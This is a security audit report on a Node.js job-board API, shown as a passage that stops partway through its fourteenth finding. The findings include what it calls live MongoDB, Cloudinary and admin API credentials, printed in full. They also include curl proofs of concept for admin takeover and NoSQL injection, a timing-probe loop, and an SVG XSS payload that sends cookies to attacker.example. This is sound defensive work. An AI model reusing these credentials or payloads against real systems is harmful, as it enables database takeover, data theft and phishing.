# Security Audit Report — careersattech-Backend

**Auditor role:** Senior application security engineer
**Audit date:** 2026-05-03
**Scope:** Full repository (`/Users/jnanashishhandique/Developer/careersattech-Backend`)
**Methodology:** White-box review of all source files, dependencies, configuration, and git history.

---

## 1. Executive Summary

careersattech-Backend is a public-facing Node.js / Express 4 API for an Indian tech job board. It exposes a public read surface (jobs, companies, blogs), an authenticated admin write surface (Firebase Bearer + a deprecated static `x-api-key` fallback), an admin scraper pipeline gated by an `x-admin-secret` header, and two cron schedulers (blog publish + daily scrape).

Defensive baseline is reasonable: `helmet`, CORS allowlist, IP-based rate limiting, Zod validation on the v2/blog/admin write paths, ObjectId middleware on `:id` routes, regex escape in legacy controllers, and a Mongoose schema-strict ODM (which neutralizes most NoSQL operator injection by casting at the schema level).

The dominant risk in this codebase is **secret hygiene**, not application logic. Live production credentials for MongoDB, both Cloudinary tenants, and the legacy `ADMIN_API_KEY` are committed into `.env.example` and remain in git history. Once published or shared, those secrets are forever compromised and must be rotated regardless of any other fix.

### Top 5 priorities (in order)

1. **`CAT-SEC-001` (Critical)** — Rotate every credential in `.env.example` and purge them from git history. MongoDB password, Cloudinary API secret × 2, and `ADMIN_API_KEY` are exposed.
2. **`CAT-SEC-002` (High)** — Remove or scope the legacy static `x-api-key` / short-Bearer fallback in `middleware/auth.js`. It is a single shared key, non-rotatable, non-revocable, and equivalent to root.
3. **`CAT-SEC-003` (High)** — Replace plaintext `===`/`!==` secret comparisons with `crypto.timingSafeEqual` and remove the `token.length > 100` heuristic that decides whether to fall through from Firebase to legacy auth.
4. **`CAT-SEC-006` (High)** — Stop sending the `SCRAPERAPI_KEY` and target URL over plaintext HTTP (`http://api.scraperapi.com?api_key=...`); use HTTPS.
5. **`CAT-SEC-004` (High)** — Restrict the unbounded `req.body.overrides` merge in `POST /api/admin/scrape/staging/:id/approve`. Enforce a field allowlist.

Other recommended P1 items: NoSQL operator injection in admin/public list endpoints (`CAT-SEC-005`), SSRF posture in the scraper (`CAT-SEC-009`), SVG upload XSS surface (`CAT-SEC-023`), unbounded click-tracking inflation (`CAT-SEC-011`).

---

## 2. Architecture Map

### Stack
- **Runtime / framework:** Node.js ≥ 18, Express 4.22.1.
- **Database:** MongoDB via Mongoose 8.23.0; in-memory test DB via `mongodb-memory-server`.
- **Auth (admin):** Firebase Admin SDK ID-token verification (`Authorization: Bearer <jwt>`), with a fallback that accepts a static `ADMIN_API_KEY` via `x-api-key` header or short Bearer.
- **Auth (scraper admin):** separate static `x-admin-secret` header.
- **Auth (public):** none for read endpoints; an opaque `cat_sess` cookie issued by `middleware/sessionCookie.js` for click attribution.
- **Validation:** Zod schemas for v2 admin / blog / admin write paths. Legacy v1 routes use a manual field allowlist.
- **Storage:** Cloudinary (two tenants — main + ads), 5 MB upload cap.
- **External egress:** AI providers (Gemini / Groq / Claude / OpenRouter), Telegram (`api.telegram.org`), Next.js revalidation webhook, ScraperAPI proxy (HTTP), arbitrary scraped origins.

### Entry points
| Surface | Auth | Purpose |
|---|---|---|
| `GET /api/jd/get`, `/api/companydetails/get`, `/api/companydetails/logo` | none | Public read of legacy v1 jobs/companies |
| `POST /api/jd/add`, `PUT /api/jd/update/:id`, `DELETE /api/jd/delete/:id`, `POST /api/jd/getposterlink` | `requireAuth` | v1 admin writes |
| `PATCH /api/jd/update/count/:id` | none | Public click increment |
| `GET/POST/PATCH/DELETE /api/admin/jobs/v2/*`, `/api/admin/companies/v2/*` | `requireAuth` + Zod | v2 admin |
| `GET /api/jobs/:slug/apply`, `POST /api/jobs/:slug/view` | sessionCookie | v2 public click tracking + redirect |
| `GET /api/blogs*` | none | Blog public list/sitemap/rss/related |
| `POST/GET/PATCH/DELETE /api/admin/blogs*`, `POST /api/admin/upload` | `requireAuth` + Zod | Blog admin |
| `GET /api/analytics/*` | `requireAuth` | Admin metrics |
| `POST/GET/DELETE /api/admin/scrape/*` | `x-admin-secret` | Scraper admin |
| **Cron** `30 12 * * *` | n/a | Daily AI scraping pipeline |
| **Cron** `* * * * *` | n/a | Blog scheduled publish |

### Trust boundaries
1. **Internet → API**: helmet, CORS allowlist (3 origins by default), and a global rate limiter (300 GET / 100 non-GET per 15 min per IP).
2. **API → MongoDB**: a single connection string, no per-tenant scoping. All admin auth grants full DB write capability.
3. **API → Cloudinary**: API secrets in env; SVG uploads accepted.
4. **Scraper → arbitrary internet origins**: no URL allowlist; URLs come from scraped HTML and from LLM output that ultimately becomes a user-visible `applyLink`.
5. **Scraper → ScraperAPI proxy**: plaintext HTTP.
6. **Scraper → Telegram**: HTTPS, but messages embed user/scraped strings into HTML-mode payloads.

### Data flow (scrape pipeline — security-relevant)
```
adapters[] (hardcoded) ─► scrapeOne()
                          fetchPage(adapter.baseUrl)
                          → cheerio extracts job + company URLs
                          → fetchPage(arbitrary URL)            ← SSRF surface
                          → stripped text → transformer
                                            └─► AI provider     ← prompt-injection input
                                                    └─► JSON job
                                                          └─► StagingJob
                                                                   └─► admin approves
                                                                         └─► Jobdesc (live)   ← `link` becomes user-visible redirect
```

---

## 3. Findings

> Severities follow the brief: Critical = unauth RCE / full DB exfil / pre-auth ATO; High = privilege bypass or significant data exposure with auth; Medium = exploitable but bounded; Low = hardening; Informational = note. Each finding cites file path and line numbers.

---

### `CAT-SEC-001` — Live secrets committed to `.env.example` and persisted in git history
- **Severity:** **Critical** (CVSS 3.1: 9.4 — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:L`)
- **Category:** OWASP A02:2021 – Cryptographic Failures · OWASP A05:2021 – Security Misconfiguration · CWE-798 (Use of Hard-coded Credentials), CWE-540 (Inclusion of Sensitive Info in Source Code)
- **Location:**
  - `.env.example:5` — MongoDB connection string with credentials
  - `.env.example:8` — `ADMIN_API_KEY=26896e0a…`
  - `.env.example:14-16` — Cloudinary tenant 1 (`CLOUD_NAME`, `API_KEY`, `API_SECRET`)
  - `.env.example:19-21` — Cloudinary tenant 2 (`CLOUD_NAME2`, `API_KEY2`, `API_SECRET2`)
  - Git history: introduced in `8ebd12a` (`fixes`) and re-touched in `6b2cffd`
- **Description:** `.env.example` is meant to document variable *names*, but this file ships real values: a MongoDB Atlas URI with user `Jnanashish` and password `S9TXx9j2AkQWkY5`, two complete Cloudinary key/secret pairs, and a 64-hex-character `ADMIN_API_KEY` that the auth middleware accepts as legacy admin credentials. These are present in the latest commit and in prior commits, so even removing them now does not undo the exposure.
- **Proof of Concept:**
  ```text
  $ git log -p -- .env.example | head -40
  +DATABASE=mongodb+srv://Jnanashish:S9TXx9j2AkQWkY5@cluster0.w0m6q.mongodb.net/...
  +ADMIN_API_KEY=26896e0ac46beec8e4baaf16e1f33c0068f98953c30f3cc838c9d773f8a0c421
  +CLOUD_NAME=dbmv2z9l9
  +API_KEY=496147658459925
  +API_SECRET=w0Bzj4VufxtWeXAlCk3Wjxv6DoE
  ```
  An attacker with read access to the repo (or any fork/mirror) can:
  - Connect directly to the production MongoDB cluster.
  - Hit any `requireAuth`-protected endpoint with `x-api-key: 26896e0a...` and gain full admin (create/update/delete jobs, companies, blogs).
  - Upload arbitrary content to both Cloudinary tenants.
- **Impact:** Full database compromise (read + write + drop), full admin write to the API, abuse of the company's Cloudinary quotas/billing, ability to inject malicious image URLs that propagate to public users.
- **Remediation:**
  1. **Rotate immediately, in this order:** the MongoDB user password, both Cloudinary API secrets, the `ADMIN_API_KEY`, the Firebase service account (verify it is not also leaked elsewhere), and any Telegram bot / AI provider keys that have ever lived in a `.env` shared by humans.
  2. Replace `.env.example` with placeholder values:
     ```text
     DATABASE=mongodb+srv://<user>:<password>@<cluster>/<db>
     ADMIN_API_KEY=<generate with: node -e "console.log(require('crypto').randomBytes(32).toString('hex'))">
     CLOUD_NAME=<your-cloudinary-cloud-name>
     API_KEY=<your-cloudinary-api-key>
     API_SECRET=<your-cloudinary-api-secret>
     ```
  3. Purge history: `git filter-repo --path .env.example --invert-paths` (or BFG), force-push, then notify any forkers. **Note:** this is destructive — coordinate with the team before doing it.
  4. Add a CI secret-scanning step (`gitleaks`, `trufflehog`, or GitHub Advanced Security secret scanning) to block re-introduction.
  5. Confirm `.gitignore` keeps `.env` out of tracking (already present at `.gitignore:3`).
- **References:** CWE-798, CWE-540, OWASP ASVS V2.10, [GitGuardian — what to do when secrets leak](https://blog.gitguardian.com/leaking-secrets-on-github-what-to-do/).

---

### `CAT-SEC-002` — Static legacy API key bypasses Firebase identity, cannot be revoked
- **Severity:** **High** (CVSS 3.1: 8.6 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`)
- **Category:** OWASP A07:2021 – Identification and Auth Failures · CWE-798
- **Location:** `middleware/auth.js:27-36`
- **Description:** The auth middleware first attempts Firebase ID-token verification, then falls through to a single shared static key:
  ```js
  if (apiKey && apiKey === process.env.ADMIN_API_KEY) {
      console.warn("DEPRECATED: Legacy x-api-key auth used on", req.method, req.url);
      req.firebaseUser = { uid: "legacy-api-key", email: "admin@internal" };
      return next();
  }
  ```
  Any holder of `ADMIN_API_KEY` is granted the maximum privilege the API offers, with no expiry, no scope, no per-user attribution, and no revocation path short of redeploying. Combined with `CAT-SEC-001`, this is currently a public credential.
- **Proof of Concept:**
  ```bash
  curl -X POST https://<host>/api/admin/jobs/v2 \
       -H 'x-api-key: 26896e0ac46beec8e4baaf16e1f33c0068f98953c30f3cc838c9d773f8a0c421' \
       -H 'content-type: application/json' \
       -d '{"title":"pwn", ...}'   # 201 Created
  ```
- **Impact:** Pre-auth admin takeover for the lifetime of the key. Even after leak rotation, the failure mode (single shared, non-rotatable secret) reproduces on the next leak.
- **Remediation:** Remove the legacy branch entirely once Firebase auth is rolled out everywhere; if a transition period is required, scope the legacy key (e.g., only allow it from CI source IPs) and emit metrics so usage can be tracked toward zero. Concretely:
  ```js
  // middleware/auth.js
  const requireAuth = async (req, res, next) => {
      const authHeader = req.headers.authorization;
      if (!authHeader?.startsWith("Bearer ")) {
          return res.status(401).json({ error: "Unauthorized" });
      }
      const token = authHeader.slice(7);
      try {
          const decoded = await admin.auth().verifyIdToken(token);
          if (decoded.email_verified !== true) {
              return res.status(403).json({ error: "Email not verified" });
          }
          req.firebaseUser = {
              uid: decoded.uid,
              email: decoded.email,
              emailVerified: decoded.email_verified,
          };
          return next();
      } catch (err) {
          return res.status(401).json({ error: "Invalid or expired token" });
      }
  };
  ```
  Also enforce an admin-claim/allowlist (e.g., custom claims `admin: true`) so a verified Firebase user is not automatically an admin.
- **References:** CWE-798, OWASP ASVS V2.1, V2.7.

---

### `CAT-SEC-003` — Token-length heuristic + non-constant-time secret comparison
- **Severity:** **High** (CVSS 3.1: 7.4 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Category:** OWASP A07:2021 · CWE-208 (Observable Timing Discrepancy), CWE-287 (Improper Authentication)
- **Location:** `middleware/auth.js:18-32`, `scraper/admin.routes.js:13-18`
- **Description:** Two issues compound:
  1. **Heuristic fall-through.** When Firebase verification throws, the middleware decides whether to retry as legacy by checking `token.length > 100`. Anything ≤ 100 chars falls through to `apiKey === process.env.ADMIN_API_KEY`. An attacker can guess that the legacy key is ≤ 100 chars and craft submissions accordingly. More importantly, a Firebase-token-shaped string that happens to fail verification at length ≤ 100 is silently treated as a candidate API key.
  2. **Plain `===` / `!==` comparison.** Both the legacy fallback (`auth.js:32`) and the scraper-admin guard (`admin.routes.js:14`) compare secrets byte-by-byte with the JS `===` operator. The early-exit semantics expose timing differences that can be amplified over the network.
- **Proof of Concept (timing — illustrative):**
  ```bash
  # Probe character-by-character
  for c in {a..z} {0..9}; do
    t=$(curl -s -o /dev/null -w '%{time_total}' \
         -H "x-api-key: ${c}xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" \
         https://<host>/api/companydetails/add)
    echo "$c $t"
  done
  ```
  In high-jitter networks the signal is weak, but constant-time is a free defense.
- **Impact:** Reduces an attack on the legacy key from a brute-force search (~2^256) to a much smaller space when combined with timing leaks; in absence of timing leak, the heuristic still widens the fallback surface.
- **Remediation:**
  ```js
  const crypto = require("crypto");

  function safeEqual(a, b) {
      const ab = Buffer.from(String(a));
      const bb = Buffer.from(String(b));
      if (ab.length !== bb.length) return false;
      return crypto.timingSafeEqual(ab, bb);
  }

  // In auth.js:
  if (apiKey && process.env.ADMIN_API_KEY && safeEqual(apiKey, process.env.ADMIN_API_KEY)) { ... }

  // In scraper/admin.routes.js:
  function requireAdminSecret(req, res, next) {
      const secret = req.headers["x-admin-secret"];
      if (!secret || !process.env.ADMIN_SECRET || !safeEqual(secret, process.env.ADMIN_SECRET)) {
          return res.status(401).json({ error: "Unauthorized" });
      }
      next();
  }
  ```
  Also drop the `token.length > 100` heuristic (see `CAT-SEC-002` remediation, which removes the fallback entirely).
- **References:** CWE-208, [Node.js docs — `crypto.timingSafeEqual`](https://nodejs.org/api/crypto.html#cryptotimingsafeequala-b).

---

### `CAT-SEC-004` — Mass assignment via unvalidated `req.body.overrides` on staging approval
- **Severity:** **High** (CVSS 3.1: 7.2 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L`)
- **Category:** OWASP A04:2021 – Insecure Design · CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **Location:** `scraper/admin.routes.js:84-87`
- **Description:** The admin "approve and copy to live" endpoint merges arbitrary JSON from the request body into the staging job and then constructs a `Jobdesc` from it:
  ```js
  const jobData = { ...staging.jobData.toObject(), ...req.body.overrides };
  const newJob = new Jobdesc(jobData);
  ```
  Unlike the v1 update/add controllers (which use a strict allowlist), this endpoint trusts the entire `overrides` object. Any holder of `x-admin-secret` (already a single shared static key — see `CAT-SEC-018`) can set arbitrary schema fields, including `priority`, `isVerified`, `isFeaturedJob`, internal counters (`totalclick`, `adclick`), `imagePath`, the redirect `link`, etc. There is no Zod validation on this route.
- **Proof of Concept:**
  ```bash
  curl -X POST https://<host>/api/admin/scrape/staging/<id>/approve \
       -H 'x-admin-secret: <ADMIN_SECRET>' \
       -H 'content-type: application/json' \
       -d '{"overrides":{"link":"https://attacker.example/phish","totalclick":99999,"isFeaturedJob":true,"priority":99,"isVerified":true}}'
  ```
- **Impact:** A leaked `x-admin-secret` (or a low-privilege console operator who should not be able to feature/verify jobs) can promote phishing redirects, fake "verified" labels, or boost ranking. Combined with `CAT-SEC-001`, the path is open today.
- **Remediation:** Validate the `overrides` payload with the same allowlist used by v1 update, or — better — drop the override mechanism and require the operator to edit the staging row first, then approve verbatim:
  ```js
  const ALLOWED_OVERRIDE_FIELDS = new Set([
      "title", "salary", "salaryRange", "skilltags", "tags",
      "location", "category", "expiresAt", "isActive",
  ]);

  const overrides = req.body.overrides || {};
  const safeOverrides = {};
  for (const [k, v] of Object.entries(overrides)) {
      if (ALLOWED_OVERRIDE_FIELDS.has(k)) safeOverrides[k] = v;
  }
  const jobData = { ...staging.jobData.toObject(), ...safeOverrides };
  ```
- **References:** CWE-915, OWASP API Security Top 10 — API6:2023 Mass Assignment.

---

### `CAT-SEC-005` — NoSQL operator injection on list endpoints (admin + public)
- **Severity:** **High** (CVSS 3.1: 6.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` for public; lower for admin paths)
- **Category:** OWASP A03:2021 – Injection · CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)
- **Location:**
  - `blog/blog.controllers.js:67-74` (`listAdminBlogs`) — `status`, `search`
  - `blog/blog.controllers.js:246-251` (`listPublicBlogs`) — `category`, `tag`, `search`
  - `scraper/admin.routes.js:39-41` (`/admin/scrape/staging`) — `status`, `source`
- **Description:** Express's default query parser parses `?tag[$ne]=null` into the JS object `{ tag: { $ne: null } }`. When that object is dropped directly into a Mongo filter, the operator is honored. Several controllers do exactly that.

  In `listAdminBlogs`:
  ```js
  if (status) conditions.status = status;        // status: { $ne: "draft" } reachable
  ```
  In `listPublicBlogs`:
  ```js
  if (category) conditions.category = category;  // category: { $regex: ".*" }
  if (tag) conditions.tags = tag;                // tags: { $in: [...] }
  ```
  In the scraper staging list:
  ```js
  if (status) filter.status = status;
  if (source) filter.source = source;
  ```
  Mongoose Schema casting *partially* mitigates this for typed `String` fields when running queries (it will cast `{$ne: ""}` strangely), but operators like `$regex`, `$in`, `$exists` are accepted and executed because Mongoose passes them through. The public blog listing is currently constrained by `status: "published"` (set first), so an attacker cannot exfiltrate drafts via that endpoint — but the admin listing is **not** so constrained, and a holder of admin credentials with the wrong scope could bypass intended status filters via `?status[$ne]=published`.
- **Proof of Concept:**
  ```bash
  # Public — pull all published posts ignoring tag filter:
  curl 'https://<host>/api/blogs?tag[%24ne]=null'

  # Admin — bypass status filter (after auth):
  curl -H 'x-api-key: ...' 'https://<host>/api/admin/blogs?status[%24ne]=published'

  # Scraper admin — same idea on staging:
  curl -H 'x-admin-secret: ...' 'https://<host>/api/admin/scrape/staging?status[%24ne]=approved'
  ```
- **Impact:** Filter bypass / unintended row leakage in admin list views; potential time-amplification via crafted `$regex` triggering full-collection scans.
- **Remediation:**
  1. Coerce all query inputs to strings before they reach Mongo:
     ```js
     const asString = (v) => (typeof v === "string" ? v : undefined);
     if (asString(status)) conditions.status = String(status);
     ```
  2. Better: validate every list query with a Zod schema (the project already has the pattern — apply `validateQuery(queryBlogsSchema)` on `listAdminBlogs` and `listPublicBlogs`; `queryBlogsSchema` already exists in `blog/blog.validators.js:50` but is **not wired up** to the public route).
  3. As a defense-in-depth global mitigation, set:
     ```js
     app.set("query parser", "simple");           // disables nested-object parsing
     // or middleware that strips keys starting with '$' / containing '.'
     ```
- **References:** CWE-943, [OWASP — Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection).

---

### `CAT-SEC-006` — `SCRAPERAPI_KEY` and target URL transmitted over plaintext HTTP
- **Severity:** **High** (CVSS 3.1: 7.4 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Category:** OWASP A02:2021 · CWE-319 (Cleartext Transmission of Sensitive Information)
- **Location:** `scraper/scraper.js:31-32`
- **Description:** When the scraper is configured to use ScraperAPI (a paid proxy), the URL is built as:
  ```js
  return `http://api.scraperapi.com?api_key=${process.env.SCRAPERAPI_KEY}&url=${encodeURIComponent(url)}&render=false`;
  ```
  This is HTTP, not HTTPS. The API key and the target URL are visible to any on-path observer (corporate proxies, ISPs, transit). API keys leaked this way usually translate directly to billable abuse on the proxy account.
- **Proof of Concept:** A passive observer on the egress path can read the full request line. ScraperAPI itself supports HTTPS at `https://api.scraperapi.com`.
- **Impact:** API-key theft → service abuse and billing fraud against the company's ScraperAPI account; revealing scraping targets to ISPs.
- **Remediation:**
  ```js
  return `https://api.scraperapi.com/?api_key=${encodeURIComponent(process.env.SCRAPERAPI_KEY)}&url=${encodeURIComponent(url)}&render=false`;
  ```
  Also pass `api_key` via the `params` object in axios so it is at least not in the cached `axios._config` URL string, and rotate the existing key once HTTPS is in place.
- **References:** CWE-319, [ScraperAPI — Authentication](https://www.scraperapi.com/documentation/).

---

### `CAT-SEC-007` — Scraper admin uses a single shared static secret with no per-user attribution
- **Severity:** **High** (CVSS 3.1: 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Category:** OWASP A07:2021 · CWE-798
- **Location:** `scraper/admin.routes.js:13-18`, all `/api/admin/scrape/*` routes
- **Description:** The scraper admin surface — which can launch the full pipeline, approve/reject staging into the live `Jobdesc` collection, delete staging records, and start adapter probes — is gated only by a static `x-admin-secret` header, compared with `!==`. There is no Firebase, no per-user identity, no audit trail of *who* approved what.
- **Impact:** A leaked secret enables full scraper abuse: spoof live jobs, push phishing `link`s, mass-delete staging, exhaust LLM budget by spamming `POST /admin/scrape/run`.
- **Remediation:** Move scraper admin behind the same Firebase auth used by `/api/admin/*` (with an `admin` custom claim). Until then: (a) constant-time compare (see `CAT-SEC-003`); (b) IP-allowlist; (c) write an audit log that captures `req.firebaseUser.uid` (or, today, source IP + UA) into `ScrapeLog` for every approve/reject/delete.
- **References:** CWE-798.

---

### `CAT-SEC-008` — SVG image upload accepted; can carry stored XSS payload
- **Severity:** **Medium** (CVSS 3.1: 6.1 — `AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
- **Category:** OWASP A03:2021 · CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location:** `controllers/jobs.controllers.js:257-268`, `controllers/common.js:9`, `blog/cloudinary.service.js:18`
- **Description:** All three upload paths whitelist `image/svg+xml` based on the client-asserted MIME type and pass the file straight to Cloudinary. SVG is XML and can contain `<script>` and event handlers. Cloudinary serves SVGs with `Content-Type: image/svg+xml`, so any browser fetching `secure_url` directly will execute embedded JS. If the frontend ever inlines an SVG (e.g., as an `<img>` *plus* an inline rendering for icons), or proxies it under the same origin, this is stored XSS against admins and end users.

  Additionally, MIME validation by `file.mimetype` is the *client-supplied* type (`express-fileupload` accepts whatever the client claims unless you use the `useTempFiles` magic-byte path — which this code does not).
- **Proof of Concept:**
  ```xml
  <!-- evil.svg, uploaded as image/svg+xml -->
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>fetch('https://attacker.example/?c='+document.cookie)</script>
  </svg>
  ```
  An admin uploads it via `POST /api/jd/getposterlink` (or `/api/admin/upload`); the returned URL is served by Cloudinary with `image/svg+xml`. Anyone visiting that URL on the same origin (or in an `<iframe>`) executes the script.
- **Impact:** Stored XSS in admin or user contexts; cookie/token theft from authenticated admins.
- **Remediation:** Drop `image/svg+xml` from the allowlist, or sanitize SVGs server-side with `DOMPurify` (Node mode) before upload:
  ```js
  const ALLOWED_MIME_TYPES = ["image/jpeg", "image/png", "image/webp"];   // remove svg
  ```
  And verify by magic bytes, not by `file.mimetype`. Where SVG must be supported, run `DOMPurify.sanitize(buffer.toString(), { USE_PROFILES: { svg: true, svgFilters: true }})` and re-write before upload.
- **References:** CWE-79, [PortSwigger — SVG XSS](https://portswigger.net/web-security/cross-site-scripting/contexts).

---

### `CAT-SEC-009` — SSRF surface in scraper (no URL allowlist on adapter-extracted destinations)
- **Severity:** **Medium** (CVSS 3.1: 6.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N`; would rise to **High** in environments exposing IMDS/internal services)
- **Category:** OWASP A10:2021 – Server-Side Request Forgery · CWE-918
- **Location:** `scraper/scraper.js:37-62`, `scraper/scraper.js:166-194`, `blog/cloudinary.service.js:75-103`, `blog/blog.controllers.js:13-22`
- **Description:** Several places fetch URLs derived from external/untrusted input:
  1. **Scraper companyUrl follow-up:** `scraper.js:166-194` extracts `companyUrl` from the scraped page's HTML (an attribute on a third-party site), resolves it against the page base, and `axios.get`s it with `maxRedirects: 5`. There is no allowlist; the third-party page can name `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS IMDS), `http://localhost:5002/api/admin/...`, `file://` (axios doesn't follow file but other adapters might), or any internal service.
  2. **Blog external image re-upload:** `blog/blog.service.js:53` runs `downloadAndReupload(originalUrl)` for any `https?://` URL appearing in the post markdown. Any admin (and per `CAT-SEC-002` anyone with the leaked legacy key) can have the server fetch arbitrary URLs and reflect their content into Cloudinary.
  3. **Revalidation webhook:** `blog/blog.controllers.js:19` POSTs to `process.env.NEXT_REVALIDATION_URL`. Trusted env, low risk, but no TLS enforcement check.
- **Proof of Concept (scraper, conceptual):** Compromise or operate a watched aggregator site (e.g., a blog post with `<a href="http://localhost:8080/admin">Apply Now</a>` matching the freshershunt selector). On the next cron run, the server fetches the internal URL and stores its body into the staging record; the body is then sent to the LLM.
- **Impact:** In environments running behind cloud metadata endpoints (AWS IMDSv1, GCP metadata) or with unauthenticated internal services, the scraper can be coerced into reading them; their content lands in `StagingJob.companyPageContent` and (after admin approval) potentially in `aboutCompany`.
- **Remediation:**
  - **Reject non-HTTPS** URLs:
    ```js
    function isPublicHttpUrl(u) {
      try {
        const url = new URL(u);
        if (url.protocol !== "https:") return false;
        const host = url.hostname;
        if (/^(127\.|10\.|192\.168\.|169\.254\.|0\.0\.0\.0$|localhost$)/.test(host)) return false;
        if (/^::1$|^fc..|^fe80/i.test(host)) return false;
        return true;
      } catch { return false; }
    }
    ```
    Apply before every `fetchPage()` and `downloadAndReupload()`.
  - **DNS-rebinding protection:** resolve the hostname, reject private/RFC1918 results, then connect by IP with `Host:` header.
  - **Disable redirects following private networks:** `maxRedirects: 0` on internal calls, or check final URL against the same allowlist.
  - On AWS, set IMDSv2 token-required mode.
- **References:** CWE-918, [PortSwigger — SSRF](https://portswigger.net/web-security/ssrf).

---

### `CAT-SEC-010` — Click-tracking endpoints lack per-resource throttling
- **Severity:** **Medium** (CVSS 3.1: 5.3 — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`)
- **Category:** OWASP A04:2021 · CWE-799 (Improper Control of Interaction Frequency)
- **Location:** `routes/jobs.routes.js:16` (`PATCH /jd/update/count/:id`), `routes/public/jobsV2.routes.js:7-8` (`GET /jobs/:slug/apply`, `POST /jobs/:slug/view`), `controllers/jobs.controllers.js:153-175`, `controllers/public/jobsV2.controllers.js:31-79`
- **Description:** Click and view counters are public, unauthenticated, and only protected by the global IP rate limiter (300 GETs / 100 non-GETs per 15 min per IP). There is no per-job, per-session, or per-IP throttling. A botnet, a `Math.random()` sweep through ObjectIds, or a single browser tab in a loop can inflate `totalclick`, `stats.applyClicks`, and `stats.pageViews` arbitrarily, including for jobs the attacker is targeting (positive boost) or competitor jobs (poison). The session cookie is not used to dedupe.
- **Proof of Concept:**
  ```bash
  for i in {1..1000}; do
    curl -s -X POST "https://<host>/api/jobs/<slug>/view" -d '{}' >/dev/null &
  done
  ```
  After 100 requests in 15 min the global limiter blocks; rotate IP via residential proxies and counts climb without bound.
- **Impact:** Polluted analytics (`/api/analytics/top-jobs`, sponsorship tier ordering, paid-promotion accounting if any).
- **Remediation:** Per-`(sessionHash, jobId, eventType)` dedupe within a window (e.g., 30 min) at the DB layer, rejecting writes for the same triple. Pseudocode:
  ```js
  // unique compound index on JobClickV2: (sessionHash, job, eventType, hourBucket)
  const hourBucket = Math.floor(Date.now() / (30*60*1000));
  await JobClickV2.updateOne(
    { sessionHash: req.sessionHash, job: jobId, eventType, hourBucket },
    { $setOnInsert: { sessionHash: req.sessionHash, job: jobId, eventType, hourBucket, ipHash: req.ipHash, userAgent: req.headers["user-agent"] } },
    { upsert: true }
  );
  ```
  Combined with a per-IP slow-bucket (e.g., 60 clicks/min/IP across all jobs).
- **References:** CWE-799.

---

### `CAT-SEC-011` — `httpOnly: false` on session cookie
- **Severity:** **Medium** (CVSS 3.1: 4.3 — `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`)
- **Category:** OWASP A05:2021 · CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag)
- **Location:** `middleware/sessionCookie.js:36-42`
- **Description:** The `cat_sess` cookie is created with `httpOnly: false`, so any client-side script (including a successful XSS) can read and exfiltrate it. The cookie itself is just an opaque ID for click attribution and is not used for authentication, so the impact is bounded. However, the value is also written into `JobClickV2.sessionHash`, where it acts as a stable de-anonymization handle across visits — exposing it to JS lets a third-party script correlate user identity across sessions.
- **Remediation:** `httpOnly: true` unless there is a frontend reason to read it. If the frontend genuinely needs to read it (it does not appear to from this repo), document why.
- **References:** CWE-1004.

---

### `CAT-SEC-012` — `applyRedirect` is an open-redirect under admin-controlled DB state
- **Severity:** **Medium** (CVSS 3.1: 4.7 — `AV:N/AC:L/PR:H/UI:R/S:C/C:N/I:L/A:N`)
- **Category:** OWASP A01:2021 / CWE-601 (URL Redirection to Untrusted Site)
- **Location:** `controllers/public/jobsV2.controllers.js:48`
- **Description:** `res.redirect(302, job.applyLink)` sends users to an admin-set URL. While the v2 create/update path validates `applyLink` with `z.string().url()`, the URL can still be any HTTPS or HTTP origin (no allowlist of known job hosts). An attacker who has admin access (or a leaked `ADMIN_API_KEY` per `CAT-SEC-001`) can use the API as a phishing redirector under the trusted `careersat.tech` brand.
- **Impact:** Phishing campaigns wearing the careersat.tech badge, including in shared social previews.
- **Remediation:** Maintain a per-record `applyHost` allowlist (e.g., the company's careerPageLink hostname, or a curated set of ATS hosts: `boards.greenhouse.io`, `jobs.lever.co`, `careers.<companyDomain>`, etc.). On redirect, validate `new URL(job.applyLink).hostname` against the allowlist and otherwise show an interstitial "you are leaving careersat.tech" page so the user makes the call.
- **References:** CWE-601.

---

### `CAT-SEC-013` — Telegram alerts use HTML parse mode without escaping injected strings
- **Severity:** **Low** (CVSS 3.1: 3.5)
- **Category:** CWE-116 (Improper Encoding or Escaping of Output)
- **Location:** `scraper/notifier.js:24-28`, `scraper/notifier.js:53-76`
- **Description:** Messages are sent with `parse_mode: "HTML"` and embed adapter names, base URLs, and raw error strings directly into `<b>...</b>` and `<code>...</code>` blocks. Adapter names are constants today, but `error.message` strings flow from scraped content (and from LLM output via the transformer error path). A `<` in a scraped page URL or a `</code><script>` substring crafted upstream would either break parsing (Telegram returns 400, lost alert) or, in the worst case, exploit other automation that ingests the Telegram channel.
- **Remediation:** Escape before formatting:
  ```js
  function escTg(s) {
      return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  }
  ```
  Apply to every interpolation.

---

### `CAT-SEC-014` — Verbose `err.message` returned to scraper-admin clients
- **Severity:** **Low** (CVSS 3.1: 3.7)
- **Category:** OWASP A05:2021 · CWE-209 (Generation of Error Message Containing Sensitive Information)
- **Location:** `scraper/admin.routes.js` — every catch block returns `res.status(500).json({ error: err.message })` (lines 31, 54, 68, 96, 118, 165, 179, 191, 213, 238, 262)
